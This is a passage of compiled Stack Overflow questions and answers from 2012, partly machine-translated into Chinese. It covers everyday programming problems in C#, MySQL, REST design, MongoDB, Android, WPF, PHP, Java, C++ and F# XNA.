您必须使用标签中的所有属性，例如 align ... 或在 css 中对其进行编码。

要测试与 Internet Explorer 的可比性，请尝试**IE Tester**：[http](http://www.my-debugbar.com/wiki/IETester/HomePage) ://www.my-debugbar.com/wiki/IETester/HomePage :)

# c# - C# 正则表达式转义某些字符

> ID：11091122
> 
> 赞同：2
> 
> 时间：2012-06-18T21:11:46.037
> 
> 标签：c#, regex, escaping

如何使用 C# Regex 转义字符串中的某些字符？

```
This is a test for % and ' thing? -> This is a test for \% and \' thing? 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-18T21:15:53.930

```
resultString = Regex.Replace(subjectString, 
    @"(?<!      # Match a position before which there is no
     (?<!\\)    # odd number of backlashes
     \\         # (it's odd if there is one backslash,
     (?:\\\\)*  # followed by an even number of backslashes)
    )
    (?=[%'])    # and which is followed by a % or a '", 
    @"\", RegexOptions.IgnorePatternWhitespace); 
```

但是，如果您试图保护自己免受恶意 SQL 查询的侵害，那么正则表达式不是正确的方法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-18T21:16:06.003

```
var escapedString = Regex.Replace(input, @"[%']", @"\$1"); 
```

这几乎就是您所需要的。在方括号内，您应该将要转义的每个字符都放在反斜杠中，其中可能包括反斜杠字符本身。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-18T21:18:01.837

我不认为这可以用正则表达式以良好的方式完成，但你可以简单地运行一个 for 循环：

```
var specialChars = new char[]{'%',....};
var stream = "";
for (int i=0;i<myStr.Length;i++)
{
   if (specialChars.Contains(myStr[i])
   {
       stream+= '\\'; 
   }
   stream += myStr[i];
} 
```

[(1) 您可以使用 StringBuilder 来防止创建过多的字符串。]

# objective-c - 如果在组织网络上，则强制用户禁用 Siri

> ID：11091125
> 
> 赞同：2
> 
> 时间：2012-06-18T21:11:58.953
> 
> 标签：objective-c, ios, xcode

伙计们，

我们有一个 iOS 应用程序，它执行一些类似于 Siri 的功能。这是用于应用内导航。问题是，它是一个医疗保健应用程序，医院不希望用户因为 HIPAA 法规而意外开始听写 Siri。因此，如果他们在医院网络上，有没有一种方法可以强制我们的配置文件让用户关闭 Siri。

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-18T21:17:10.730

是的：您可以安装禁用 Siri 的配置文件，等等。检查[iPhone 配置实用程序](http://www.apple.com/support/iphone/enterprise/)，特别是它的[限制设置](http://help.apple.com/iosdeployment-ipcu/#app665501b0)。

# mysql - MySql report grouped by location and hour of day

> ID：11091129
> 
> 赞同：0
> 
> 时间：2012-06-18T21:12:08.093
> 
> 标签：mysql, group-by

I have a mysql table where each entry contains among other, a location string and a datetime field.

I would like to build a mysql query that generates a report with the count(items) grouped by hour of day (on the rows) and the locations (on the columns).

So far I'm manually generating reports grouped by location and I have a WHERE clause where I iterate over each hour of day (24 in number). This is too cumbersome and I would like to do it automatically.

*EDIT*

This is the query i'm now trying to use based on the answer from fxzuz

```
SELECT locations.locationName, DATE_FORMAT(  '%Y-%m-%d %H', entries.CreatedOn ) , COUNT( pk_entry ) 
FROM entries
LEFT JOIN locations ON locations.computerName = entries.location
GROUP BY DATE_FORMAT(  '%Y-%m-%d %H', entries.CreatedOn ) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-18T21:19:20.357

mysql 函数 DATE_FORMAT 怎么样？

```
SELECT location, DATE_FORMAT(datetime, '%Y-%m-%d %H'), COUNT(id) FROM table GROUP BY DATE_FORMAT('%Y-%m-%d %H', datetime); 
```

# web-services - REST API 设计：可以在 PUT 调用期间更改资源标识符吗？

> ID：11091133
> 
> 赞同：8
> 
> 时间：2012-06-18T21:12:20.540
> 
> 标签：web-services, api, rest

我很想了解更多关于 PUT 调用的 RESTful 设计模式。具体来说，我在 PUT 调用中更改资源 ID 是否违反了规范？

考虑以下...

```
POST /api/event/  { ... } - returns the resource ID (eventid) of the new event in the body
GET  /api/event/eventid
PUT  /api/event/eventid   - returns the (possibly new) resource ID depending on request body
GET  /api/event/eventid   - fails if the original eventid was used in the URI 
```

如果 eventid 表示内部资源（如数据库记录），则 GET 和 PUT 的端点可以快速访问资源。如果 PUT 导致服务器移动底层资源，则 ID 可能会更改。

我这样做是否违反了规范？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-07T03:08:28.840

REST 不是一个严格的规范，而是一组可以遵循的准则和最佳实践来构建易于理解和使用的 Web 服务。因此，没有什么可以阻止您在 PUT 期间更改资源 ID。

话虽这么说，这样做是 IMO 一种不好的做法。REST 背后的想法之一是可以使用[URI](http://en.wikipedia.org/wiki/Uniform_resource_identifier)引用每个资源。在您的情况下，此 URI 是路径和（我假设）内部 ID 的串联。此 URI 可以被其他“系统”使用并存储为引用。如果更改 PUT 上资源的 ID，则更改 URI 并且对该资源的所有引用都将被破坏 (404)。

如果您觉得需要更改作为 URI 一部分的 ID，那么您可能没有为它选择正确的属性。考虑其他不可变的东西（例如：用[UUID](http://en.wikipedia.org/wiki/Universally_unique_identifier)标记您的资源并使用它而不是内部数据库 ID）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-18T21:15:45.753

没有完全解决您的问题，但这让我担心：

> 返回正文中新事件的资源 ID（eventid）

您没有返回整数 id，然后让客户端从中构造 url，是吗？一个适当的 REST 应用程序应该为资源提供 url，而不是 id。

至于你的问题 - PUT 的意思是“在这个位置创建一个新资源”。可以想象，您可以使用重定向和`Location`标题进行回复，但这有点奇怪。此外，PUT 的语义要求您随请求一起发送整个实体，这可能不是您在这种情况下想要的。也许在这种情况下使用 POST 会更合适？（例如 POST on`/api/event/1234`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-19T09:49:38.377

我觉得还可以；PUT 仍然是幂等的（重复调用不会导致其他修改）。

只是：我会确保不重复使用旧 ID，并让 api 返回 301 代码以调用旧 ID（以防其他客户端具有资源链接）。

也许修改 ID 的初始 PUT 应该返回指向新资源位置的 303 代码，我在这里不确定。

# mongodb - Can I save space in my Mongodb indexes by converting ASCII strings to bytes?

> ID：11091143
> 
> 赞同：1
> 
> 时间：2012-06-18T21:12:56.080
> 
> 标签：mongodb, utf-8, bson, mongodb-java

I have a lot of object with language code as a key field. Since both Java and Mongodb use UTF-8 natively and since the language codes are ASCII it seems to be that they should take 1 byte per character plus the \0 terminator. So the language code "en" should take only 3 bytes in the BSON object and in the index.

Is this correct? I am wondering whether I save anything by converting my fields to a byte array like:

```
byte[] lcBytes = langCode.getBytes("ISO-8859-1"); 
```

before saving them to Mongodb with the Java driver?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-19T00:27:45.963

根据[bson spec](http://bsonspec.org/#/specification)，它没有什么区别：

```
string  ::= int32 (byte*) "\x00"
binary  ::= int32 subtype (byte*) 
```

换句话说，字符串以零结尾（因此浪费了一个字节），而二进制文件需要一个一字节的子类型字段。

当然，完美匹配的字符集可能更有效，因为字节数组本身可能更小（例如，您经常需要的字符不需要三个字节，但只需要一个）。再说一次，我认为这不值得麻烦，因为它使使用正则表达式、map/reduce、js 函数等变得不可能。也许对于非常古老的字符集，但 8859-1 并不太特别。

作为旁注，请记住[索引大小限制为大约 1k](http://docs.mongodb.org/manual/reference/limits/)，因此您不能在索引中抛出很长的字符串（这在性能方面不是一个好主意）。

如果你只需要通过相等查询，也许你可以选择一个哈希来代替？如果您需要存储非常大的字符串（非索引），压缩算法可能是个好主意。

# android - TouchDelegate not receiving tap events correctly

> ID：11091145
> 
> 赞同：0
> 
> 时间：2012-06-18T21:13:03.520
> 
> 标签：android, view

Edit: This problem was down to me passing the wrong view to the Touch Delegate...problem is resolved now....

My `RelativeLayout` extension enlarges the clickable area of an `ImageView`. The RelativeLayout is the root `View` of the `ListView` row. The problem is when tapping areas that should be delegated to the `ImageView`, the `ListView`'s `onItemClicked` is triggered.

My code is at the end and below is an image of what the extended bounds of the `ImageView` should be. If I tap on blue areas that are *not* the image, the click is received by the `ListView`.

![Blue areas indicate new bounds of the ImageView](../Images/377c1a120fbdfe29f93162db20c1c57f.png)

```
public class DelegatingRelativeLayout extends RelativeLayout {

//relevant code moved to top
@Override 
protected void onLayout(boolean changed, int l, int t, int r, int b) {
    super.onLayout(changed, l, t, r, b);

    final float density = getContext().getResources().getDisplayMetrics().density;
    int extra = (int) (density * 4 + 0.5f);

    Rect rect = new Rect(0, 0, mEnlargedView.getWidth(), getHeight());
    rect.right += extra; //extend bounds by 4 pixels
    setTouchDelegate(new TouchDelegate(rect, mEnlargedView));
    mExtendedBounds = rect;
}

public void setEnlargedView(View v) {       
    mEnlargedView = v;
}

private static final boolean DEBUG_DRAW = true;

private View mEnlargedView;
private Rect mExtendedBounds;

//constructors removed

@Override
protected void dispatchDraw(Canvas canvas) {

    if (DEBUG_DRAW) {
        Paint p = new Paint();
        p.setColor(Color.BLUE);
        canvas.drawRect(mExtendedBounds, p);
    }

    super.dispatchDraw(canvas);
}

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-21T00:44:35.817

呃，我刚刚意识到我一直在将错误的视图传递给触摸代表>。<现在工作正常......>。<

# javascript - jQuery: $(this) vs. this.$()

> ID：11091148
> 
> 赞同：19
> 
> 时间：2012-06-18T21:13:05.490
> 
> 标签：javascript, jquery, this, ember.js

In Ember.js's [docs](http://emberjs.com/guides/asynchrony/), they have a jQuery code snippet with the following syntax:

```
this.$().button(); 
```

Is this snippet only turning `this` into a jQuery object so that the jQuery UI `.button()` function can be called on it?

Would this snippet be identical?

```
$(this).button(); 
```

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-06-18T21:23:12.827

[源代码](https://github.com/emberjs/ember.js/blob/332d2146f6f4da2008546665f33513a0cc4ea876/packages/ember-views/lib/views/view.js#L1065-1078)解释如下：

```
/**
    Returns a jQuery object for this view's element. If you pass in a selector
    string, this method will return a jQuery object, using the current element
    as its buffer.

    For example, calling `view.$('li')` will return a jQuery object containing
    all of the `li` elements inside the DOM element of this view.

    @param {String} [selector] a jQuery-compatible selector string
    @returns {Ember.CoreQuery} the CoreQuery object for the DOM node
  */
  $: function(sel) {
    return this.invokeForState('$', sel);
  }, 
```

所以回答你的问题：不，它不一样`$(this)`，它会将 ember 视图实例包装在一个 jQuery 对象中......

# wpf - I just need a simple WPF ToolTip Style that displays multiple lines

> ID：11091149
> 
> 赞同：7
> 
> 时间：2012-06-18T21:13:08.073
> 
> 标签：wpf, styles, tooltip

Due to all the noise about fancy, super, huge, and blah, blah, blah, tooltips, I cannot find the answer.

I just need a simple **style** that sets `TextWrapping="Wrap"` and allows me to set a width.

One that duplicates the existing / default style, but just word wraps.

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-06-18T21:28:21.977

```
<Window.Resources>
    <Style TargetType="{x:Type ToolTip}">
        <Setter Property="ContentTemplate">
            <Setter.Value>
                <DataTemplate>
                    <TextBlock TextWrapping="Wrap" Text="{Binding}" />
                </DataTemplate>
            </Setter.Value>
        </Setter>
    </Style>
</Window.Resources>
<Grid>
    <Rectangle Width="100" Height="100" Fill="Red">
        <Rectangle.ToolTip>
            <ToolTip Width="100">
                This is some text with text wrapping.
            </ToolTip>
        </Rectangle.ToolTip>
    </Rectangle>
</Grid> 
```

此示例假设您希望能够根据使用情况设置宽度。如果要将其设置为样式的一部分，请将其添加到 TextBlock 元素。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-04-02T14:44:56.287

此样式可防止在空字符串上弹出工具提示。

```
<Style TargetType="ToolTip">
    <Setter Property="Template">
        <Setter.Value>
            <ControlTemplate TargetType="ToolTip">
                <TextBlock Text="{TemplateBinding Content}"
                           MaxWidth="400"
                           TextWrapping="Wrap"/>
            </ControlTemplate>
        </Setter.Value>
    </Setter>
    <Style.Triggers>
        <Trigger Property="Content" Value="">
            <Setter Property="Visibility" Value="Collapsed" />
        </Trigger>
    </Style.Triggers>
</Style> 
```

或使用 ContentTemplate：

```
<Style TargetType="{x:Type ToolTip}">
    <Setter Property="ContentTemplate">
        <Setter.Value>
            <DataTemplate>
                <StackPanel>
                    <TextBlock Text="{Binding}"
                               MaxWidth="400"
                               TextWrapping='Wrap' />
                </StackPanel>
            </DataTemplate>
        </Setter.Value>
    </Setter>
    <Style.Triggers>
        <Trigger Property="Content" Value="">
            <Setter Property="Visibility" Value="Collapsed" />
        </Trigger>
    </Style.Triggers>
</Style> 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-11T10:22:12.910

如果您只想获得以下效果，请阅读[这篇文章](http://xinyustudio.wordpress.com/2013/03/08/wpf-tooltip-control-tips-tricks/)。

![在此处输入图像描述](../Images/9277e580e48c01b50ecae04f7b3842b8.png) ![在此处输入图像描述](../Images/8aebfea8d4f0bf5bae0b20b4eb23781c.png) ![在此处输入图像描述](../Images/5c8f730c0c33fdc907da723e94020131.png)

# php - PHP Parse SOAP envelope to XML

> ID：11091150
> 
> 赞同：0
> 
> 时间：2012-06-18T21:13:10.607
> 
> 标签：php, soap, xml-parsing

I been at this all day and feel like I'm getting nowhere, I need to get this to display as an xml like how it is on this page [http://admin.stock.imdfulfilment.com/api/service.asmx/GetCouriers](http://admin.stock.imdfulfilment.com/api/service.asmx/GetCouriers). Yet the following code

```
<?
try
{
    $soap_url = 'http://admin.stock.imdfulfilment.com/api/service.asmx?wsdl';
    $client = new SoapClient($soap_url, array(
                'trace' => 1,
                'exceptions'=>true,
                'GetCouriersResult' => 'xml')
            );

    $client->GetCouriers();
        $xml = simplexml_load_string($client->__getLastResponse());
        $xml->registerXPathNamespace('soap', 'http://schemas.xmlsoap.org/soap/envelope/');
        $xml->registerXPathNamespace('xsi', 'http://www.w3.org/2001/XMLSchema-instance');
    $xml->registerXPathNamespace('xsd', 'http://www.w3.org/2001/XMLSchema');
    foreach($xml->xpath('//soap:Envelope') as $item) {
        echo "$item\n\n";
    }
}
catch (Exception $e)
{
   print_r($e);
}
?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T21:40:48.840

它返回双重编码的 XML，我不知道为什么有人认为这是一个好主意（也许有人不想费心更新他们的 wsdl）：

```
$soap_url = 'http://admin.stock.imdfulfilment.com/api/service.asmx?wsdl';
$client = new SoapClient($soap_url, array(
            'trace' => 1,
            'exceptions'=>true,
            'GetCouriersResult' => 'xml')
        );

$result = $client->GetCouriers();
echo $result->GetCouriersResult->any;
//or you can load it in DOM or simpleXML if you need to read it;
$the_response_should_have_been = new simpleXMLElement($result->GetCouriersResult->any); 
```

# css - div内的css对齐列表

> ID：11091151
> 
> 赞同：0
> 
> 时间：2012-06-18T21:13:20.180
> 
> 标签：css, layout, text

我在 CSS 上对齐图像时遇到了很多问题。事情是这样的，我在这个 div 中有一个名为“toggle”的 div 我在每个 li 上有一个列表 ul-li 我有文本，然后是 3 个图像，但是我想让图像对齐一些图像的对齐方式相对于文本而不是左侧填充。

[http://aluna.webdcg.com/visistat/](http://aluna.webdcg.com/visistat/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T21:37:49.450

也许这就是你需要的。参见代码：http: [//jsfiddle.net/67VWe/](http://jsfiddle.net/67VWe/)

CSS：

```
* { font-family: Tahoma; }
ul { width: 200px; margin: 20px; border: 1px solid #777; }
li { padding: 2px; border-bottom: 1px dotted #777; }
li label { width: 120px; float: left; }
​ 
```

HTML：

```
<div id="toggle">
    <ul>
        <li><label>Text 1</label> <img src="http://admin.visistat.com/sales/img/icon-pulse-dot-red.png" width="22" height="22" /></li>
        <li><label>Text 1234</label> <img src="http://admin.visistat.com/sales/img/icon-pulse-dot-red.png" width="22" height="22" /></li>
        <li><label>Text 1234567</label> <img src="http://admin.visistat.com/sales/img/icon-pulse-dot-red.png" width="22" height="22" /></li>
    </ul>
</div> 
```

--

**标签**标签、宽度**和**浮点**值**起到了作用。

# java - 如何提高这种双重打印的性能？

> ID：11091152
> 
> 赞同：1
> 
> 时间：2012-06-18T21:13:38.450
> 
> 标签：java, performance, list, optimization

我有以下静态方法，可以打印从 40.000 行 .xls 电子表格导入的数据。

现在，在控制台打印数据大约需要 27 秒，内存消耗巨大。

```
import org.apache.poi.hssf.usermodel.*;
import org.apache.poi.ss.usermodel.*;

public static void printSheetData(List<List<HSSFCell>> sheetData) {
    for (int i = 0; i < sheetData.size(); i++) {
        List<HSSFCell> list = (List<HSSFCell>) sheetData.get(i);
        for (int j = 0; j < list.size(); j++) {
            HSSFCell cell = (HSSFCell) list.get(j);
            System.out.print(cell.toString());
            if (j < list.size() - 1) {
                System.out.print(", ");
            }
        }
        System.out.println("");
    }
} 
```

免责声明：我知道，我知道大数据属于数据库，不要在控制台打印输出，过早优化是万恶之源……

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-18T21:16:22.603

您是否尝试过使用 StringBuilder 创建大字符串，而不是一次打印出每一行，然后一次打印，或者在添加了这么多行之后？您将使用 StringBuilder 作为一种缓冲区。

例如，

```
public static void printSheetData(List<List<HSSFCell>> sheetData) {
    StringBuilder strBuilder = new StringBuilder();
    for (int i = 0; i < sheetData.size(); i++) {
        List<HSSFCell> list = (List<HSSFCell>) sheetData.get(i);
        for (int j = 0; j < list.size(); j++) {
            HSSFCell cell = (HSSFCell) list.get(j);
            // System.out.print(cell.toString());
            strBuilder.append(cell.toString());
            if (j < list.size() - 1) {
                // System.out.print(", ");
                strBuilder.append(", ");
            }
        }
        // System.out.println("");
        strBuilder.append("\n");

        // consider testing strBuilder size here and printing it out if
        // it is greater than some pre-set, then re-initializing the 
        // strBuilder variable.
    }
    System.out.println(strBuilder.toString());
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-18T22:33:01.463

试试 log4j。它会为你缓冲。此外，您可以在阅读时打印而不是将整个电子表格加载到内存中吗？

# c++ - creating an array of objects within a function of a program

> ID：11091154
> 
> 赞同：0
> 
> 时间：2012-06-18T21:13:41.963
> 
> 标签：c++, function, object

could someone please tell me what I need to do in order to create an array of objects in a function (other than in the main function).

I will try to explain by making up some sort of example...

Let's say I have a program named TimeScheduler.cpp that implements the class Schedule.h (and I have the implementation in a separate file Schedule.cpp where we define the methods).

In the declaration file we have declared two constructors

```
 Schedule(); //the default 
```

and

```
 Schedule(int, int, int);//accepts three arguments 
```

to get to the point--let's say in the main program file TimeScheduler.cpp we created our own functions in this program apart from the functions inherited from the class Schedule. so we have our prototypes listed at the top.

```
 /*prototypes*/

  void makeSomeTime(); 
```

etc.....

we have

```
 main(){ 

//etc etc...
 } 
```

we then define these program functions

```
 void makeSomeTime(){
      //process
    } 
```

let's say that inside the function makeSomeTime(), we would like to create an array of Schedule objects like this

```
 Schedule ob[]={ 
       summer(5,14, 49), 
       fall(9,25,50)
    }; 
```

what do I have to do to the function makeSomeTime() in order for it to allow me to create this array of objects. The reason I ask is currently i'm having difficulty with my own program in that it WILL allow me to create this array of objects in main()....but NOT in a function like I just gave an example of. The strange thing is it will allow me to create a dynamic array of objects in the function..... like

```
 Schedule *ob = new Schedule[n+1];
   ob[2]= Schedule(x,y,z); 
```

Why would it let me assign to a non-dynamic array in main(), but not let me do that in the function?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-18T21:39:54.347

这是不正确的：

```
 Schedule ob[]={ 
       summer(5,14, 49), 
       fall(9,25,50)
    }; 
```

您*似乎*正在尝试引入 3 个新名称：

1.  `ob`，这是一个`Scedule`s的数组
2.  `summer`，这是一个`Schedule`
3.  `fall`，这是一个`Schedule`

你不能像那样介绍`summer`和`fall`作为新名字。也许这只是一个错字，你的意思是：

```
Schedule ob[]={ 
   Schedule(5,14, 49), 
   Schedule(9,25,50)
}; 
```

...这非常好，并且可以存在于以下函数中：

```
void make_schedule()
{
    Schedule ob[]={ 
       Schedule(5,14, 49), 
       Schedule(9,25,50)
    };
} 
```

但是现在你有另一个问题——你的`make_schedule`函数返回了`void`。您在其中创建的`Schedule`数组`make_schedule`被创建，然后被丢弃。如果你想从一个函数返回一个数组，*最好*的办法是使用 a `vector`，然后返回：

```
std::vector<Schedule> make_schedule()
{
    Schedule ob[]={ 
       Schedule(5,14, 49), 
       Schedule(9,25,50)
    };

    const size_t num_obs = sizeof(ob)/sizeof(ob[0]);
    std::vector<Schedule> ret;
    std::copy( &ob[0], &ob[num_obs], std::back_inserter(ret));

    return ret;
} 
```

一个更差的选择是使用动态分配来分配你的数组，并返回一个指向第一个元素的指针。在这种情况下，使用时`new []`需要注意的是，您只能使用默认构造函数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-19T13:29:00.257

我决定不使用向量，而是使用 unordered_map。我没有意识到当你在 C++ 中“命名”一个对象时，你并没有真正给它一个名字……它只是用作一种临时引用。如果要使用名称，最好使用名称作为集合中的一种键值。喜欢：

字符串食物名称；

foodname = "蛋糕";

[食品名称，10.95]

foodname = "面包";

[食品名称，5.75]

[我在http://msdn.microsoft.com/en-us/library/bb981993.aspx](http://msdn.microsoft.com/en-us/library/bb981993.aspx)上找到了有关 unordered_map 的帮助

# javascript - Call a JavaScript function in a Google Chrome window from a vb.net program

> ID：11091159
> 
> 赞同：0
> 
> 时间：2012-06-18T21:13:57.177
> 
> 标签：javascript, vb.net, google-chrome

I am having a real problem with this.

I want to know if it is possible to run/call a javascript function in a Google Chrome web browser window from a VB.net application.

The scenario is that i want to monitor the pc activity (which i know how to) and then if a certain event is met (for example, high ram usage) then it calls a JavaScript function in a Google Chrome web browser window so the website is updated. Sort of like a bridge.

The only bit it need to know is the vb.net code for how to access a chrome window and invoke a javascript function if its possible. I assume i will need to use process handlers?

Any help is appreciated.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T21:40:51.413

这可以通过使用网络套接字来实现。[SignalR](https://github.com/SignalR/SignalR)是一个不错的库，可以看看，[这里](https://github.com/SignalR/SignalR/wiki/QuickStart-Persistent-Connections)有一个很好的例子来帮助你入门。

# .net - REST API：获取带有正文的请求

> ID：11091160
> 
> 赞同：26
> 
> 时间：2012-06-18T21:14:00.047
> 
> 标签：.net, rest, asp.net-web-api, http-get, frombodyattribute

我想实现一个 REST API，并且在我的 GET 请求上需要一个正文。（就像这里讨论的：[HTTP GET with request body](https://stackoverflow.com/questions/978061/http-get-with-request-body)）

是否存在无法通过 GET 请求发送正文的 http 客户端？Fiddler 能够做到这一点，尽管消息框是红色的。

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2012-06-18T21:24:00.540

作为一般规则，REST 中 GET 的想法是您的任何参数都在 URL 中发送。正如您所包含的问题的答案所示，它是可行的，但错过了 REST 的要点，即拥有一致的 webbish 界面。如果您想将复杂的数据传递到您的端点，您可能需要使用 POST，您的用户会期望它有一个正文。我强烈建议重新考虑该实施。

但是对于您的实际问题，请确保有些客户端无法在 GET 上发送正文。大多数情况下，我会想象您的客户将是编程的，例如 python 的 urlib2，虽然您*可以*在 GET 上设置一个主体，但这并不是该模块的真正预期用途，因此您迫使程序员变得怪异。更重要的是，REST api 的想法是与客户端无关，这就是为什么在我看来你的 API 设计应该在这里重新设计。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-06-18T21:42:12.073

在 GET HTTP 请求中使用 body 是个坏主意。是的，似乎“法律上”的 HTTP GET 可以有正文，但“事实上”你会遇到问题：

1.  使用客户端框架/库。很难找到它的支持。
2.  服务器可以忽略 GET 请求的主体。无论如何，这不是标准方式，可能是服务器或其配置的问题。
3.  它使您的代码，尤其是在服务器端，对其他人来说不清楚，因为没有人会期望 GET 带有正文。

你在寻找艰难的道路吗？使用带有身体的 GET，您将遇到很多陷阱。为什么不使用其他 HTTP 动词？

例如使用 POST（或其他一些动词），而不是：

1.  准备好客户端库很容易，
2.  服务器或服务器配置没有问题，
3.  其他人很清楚

不要寻找更难的方法:)

# php - PHP邮件脚本html格式化

> ID：11091162
> 
> 赞同：0
> 
> 时间：2012-06-18T21:14:11.333
> 
> 标签：php

有人好心地为我发布了这段代码，但它只在生成的电子邮件中返回“/table”——有什么想法吗？它需要一个关闭的html标签吗？

```
$mailHeader .= "Content-type: text/html; charset=iso-8859-1\r\n";
$formcontent ="<table border='1'>";
foreach ($_POST as $field=>$value)
{
$formcontent.="<tr>";
$formcontent .= "<td>$field:</td> <td>$value</td>";
$formcontent.="</tr>";
}
$formcontent .= '<tr><td>User-Agent: </td><td>'.$_SERVER['HTTP_USER_AGENT'].'</td>';
$formcontent ="</table>"; 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-18T21:15:46.110

目前最后一行是：

```
$formcontent ="</table>"; 
```

它应该是：

```
$formcontent .="</table>"; 
```

没有点，它会覆盖内容，而不是连接。

# performance - 简单的 XNA 2D 演示：为什么我的 F# 版本比 C# 版本慢？

> ID：11091163
> 
> 赞同：3
> 
> 时间：2012-06-18T21:14:11.443
> 
> 标签：performance, f#, xna, functional-programming, c#-to-f#

当运行这个 XNA 应用程序时，它应该显示一个从左上角移动到右下角的旋转矩形。

看起来我的 F# 版本明显慢得多。似乎 Draw 方法跳过了很多帧。

我正在使用 VS 2012 RC、XNA 4.0、.NET 4.5、F# 3.0。我正在努力使其尽可能实用。

性能不佳的原因可能是什么？

C＃：

```
class Program
{
    static void Main(string[] args)
    {
        using (var game = new FlockGame())
        {
            game.Run();
        }
    }
}

public class FlockGame : Game
{
    private GraphicsDeviceManager graphics;
    private DrawingManager drawingManager;
    private Vector2 position = Vector2.Zero;

    public FlockGame()
    {
        graphics = new GraphicsDeviceManager(this);
    }

    protected override void Initialize()
    {
        drawingManager = new DrawingManager(graphics.GraphicsDevice);
        this.IsFixedTimeStep = false;
    }

    protected override void Update(GameTime gameTime)
    {
        position = new Vector2(position.X + 50.1f * (float)gameTime.ElapsedGameTime.TotalSeconds,
                               position.Y + 50.1f * (float)gameTime.ElapsedGameTime.TotalSeconds);
        base.Update(gameTime);
    }

    protected override void Draw(GameTime gameTime)
    {
        //this.GraphicsDevice.Clear(Color.Lavender)

        drawingManager.DrawRectangle(position, new Vector2(100.0f, 100.0f), 0.7845f, Color.Red);

        base.Draw(gameTime);
    }
}

public class DrawingManager
{
    private GraphicsDevice GraphicsDevice;
    private Effect Effect;

    public DrawingManager(GraphicsDevice graphicsDevice)
    {
        GraphicsDevice = graphicsDevice;
        this.Effect =
            new BasicEffect(this.GraphicsDevice)
                {
                    VertexColorEnabled = true,
                    Projection = Matrix.CreateOrthographicOffCenter(0.0f, this.GraphicsDevice.Viewport.Width,
                                                                    this.GraphicsDevice.Viewport.Height,                                                                         0.0f, 0.0f, 1.0f)
                };
    }

    private VertexPositionColor[] GetRectangleVertices (Vector2 center, Vector2 size, float radians, Color color)
    {
        var halfSize = size/2.0f;
        var topLeft = -halfSize;
        var bottomRight = halfSize;
        var topRight = new Vector2(bottomRight.X, topLeft.Y);
        var bottomLeft = new Vector2(topLeft.X, bottomRight.Y);

        topLeft = Vector2.Transform(topLeft, Matrix.CreateRotationZ(radians)) + center;
        topRight = Vector2.Transform(topRight, Matrix.CreateRotationZ(radians)) + center;
        bottomRight = Vector2.Transform(bottomRight, Matrix.CreateRotationZ(radians)) + center;
        bottomLeft = Vector2.Transform(bottomLeft, Matrix.CreateRotationZ(radians)) + center;

        return new VertexPositionColor[]
        {
            new VertexPositionColor(new Vector3(topLeft, 0.0f), color),
            new VertexPositionColor(new Vector3(topRight, 0.0f), color),
            new VertexPositionColor(new Vector3(topRight, 0.0f), color),
            new VertexPositionColor(new Vector3(bottomRight, 0.0f), color),
            new VertexPositionColor(new Vector3(bottomRight, 0.0f), color),
            new VertexPositionColor(new Vector3(bottomLeft, 0.0f), color),
            new VertexPositionColor(new Vector3(bottomLeft, 0.0f), color),
            new VertexPositionColor(new Vector3(topLeft, 0.0f), color)
        };
    }

    public void DrawRectangle(Vector2 center, Vector2 size, float radians, Color color)
    {
        var vertices = GetRectangleVertices(center, size, radians, color);

        foreach (var pass in this.Effect.CurrentTechnique.Passes)
        {
            pass.Apply();
            this.GraphicsDevice.DrawUserPrimitives(PrimitiveType.LineList, vertices, 0, vertices.Length/2);
        }
    }
} 
```

F＃：

```
namespace Flocking

module FlockingProgram = 
    open System
    open Flocking

    [<STAThread>]
    [<EntryPoint>]
    let Main _ =
        use g = new FlockGame()
        g.Run()
        0 
```

//------------------------------------------------ ------------------------------

```
namespace Flocking

open System
open System.Diagnostics
open Microsoft.Xna.Framework
open Microsoft.Xna.Framework.Graphics
open Microsoft.Xna.Framework.Input

type public FlockGame() as this =
    inherit Game()
    let mutable graphics = new GraphicsDeviceManager(this)
    let mutable drawingManager = null
    let mutable position = Vector2.Zero

    override Game.LoadContent() =
        drawingManager <- new Rendering.DrawingManager(graphics.GraphicsDevice)
        this.IsFixedTimeStep <- false

    override Game.Update gameTime =
        position <- Vector2(position.X + 50.1f * float32 gameTime.ElapsedGameTime.TotalSeconds,
                            position.Y + 50.1f * float32 gameTime.ElapsedGameTime.TotalSeconds)
        base.Update gameTime

    override Game.Draw gameTime =
        //this.GraphicsDevice.Clear(Color.Lavender)

        Rendering.DrawRectangle(drawingManager, position, Vector2(100.0f, 100.0f), 0.7845f, Color.Red)

        base.Draw gameTime 
```

//------------------------------------------------ ------------------------------

```
namespace Flocking

open System
open System.Collections.Generic
open Microsoft.Xna.Framework
open Microsoft.Xna.Framework.Graphics
open Microsoft.Xna.Framework.Input

module Rendering = 

    [<AllowNullLiteral>]
    type DrawingManager (graphicsDevice : GraphicsDevice) = 
        member this.GraphicsDevice = graphicsDevice
        member this.Effect =
            new BasicEffect(this.GraphicsDevice,
                VertexColorEnabled = true,
                Projection = Matrix.CreateOrthographicOffCenter(0.0f,
                    float32 this.GraphicsDevice.Viewport.Width,
                    float32 this.GraphicsDevice.Viewport.Height,
                    0.0f, 0.0f, 1.0f))

